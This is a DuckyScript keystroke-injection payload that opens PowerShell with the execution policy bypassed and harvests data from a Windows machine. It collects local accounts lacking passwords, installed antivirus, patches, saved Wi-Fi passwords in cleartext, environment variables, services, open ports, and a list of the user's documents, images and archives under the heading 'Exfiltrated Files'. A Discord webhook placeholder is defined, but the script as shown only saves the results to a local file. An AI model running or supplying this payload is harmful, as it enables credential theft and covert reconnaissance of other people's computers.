REM Start PowerShell
GUI r
DELAY 1000
STRING powershell -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 2000

REM Set Discord Webhook URL
DELAY 1000
STRING $webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE";
ENTER
DELAY 1000

REM Set output file path
STRING $outputFile = "C:\PATH\TO\YOUR\results.txt";
ENTER
DELAY 1000

REM Gather system info and store it in a variable and append to the output file
STRING $stats = ''; $stats += '--- Computer System Info ---' + [Environment]::NewLine; $stats += (Get-CimInstance -ClassName Win32_ComputerSystem | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Local Users ---' + [Environment]::NewLine; $stats += (Get-LocalUser | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Users Without Passwords ---' + [Environment]::NewLine; $stats += (Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Antivirus Products ---' + [Environment]::NewLine; $stats += (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Installed Hotfixes ---' + [Environment]::NewLine; $stats += (Get-CimInstance -ClassName Win32_QuickFixEngineering | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Network Profiles and Passwords ---' + [Environment]::NewLine;
ENTER
DELAY 1000

STRING $stats += ((netsh wlan show profiles) | Select-String '\\:(.+)$' | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object { (netsh wlan show profile name=$name key=clear) } | Select-String 'Key Content\\\\W+\\\\:(.+)$' | ForEach-Object { $pass = $_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{PROFILE_NAME=$name; PASSWORD=$pass} } | Format-Table -AutoSize | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Environment Variables ---' + [Environment]::NewLine; $stats += (dir env: | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Computer Info ---' + [Environment]::NewLine; $stats += (Get-Computerinfo | Out-String);
ENTER
DELAY 3000

STRING $stats += '--- Running Services ---' + [Environment]::NewLine; $stats += (Get-Service | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Active IPv4 Addresses ---' + [Environment]::NewLine; $stats += (Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object IPAddress -NotMatch '(127.0.0.1|169.254.\\d+.\\d+)' | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Listening Ports ---' + [Environment]::NewLine; $stats += (Get-NetTCPConnection | Where-Object -Property State -Match Listen | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- TCP Connection Info ---' + [Environment]::NewLine; $stats += (Get-NetTCPConnection | Select-Object -Property * | Out-String);
ENTER
DELAY 1000

STRING $stats += '--- Exfiltrated Files ---' + [Environment]::NewLine; $userDir = [Environment]::GetFolderPath('UserProfile'); $stats += (Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse | Out-String);
ENTER
DELAY 1000

REM Save the results to a text file
STRING $stats | Out-File -FilePath $outputFile;
ENTER
DELAY 1000

REM Close powershell
STRING exit
ENTER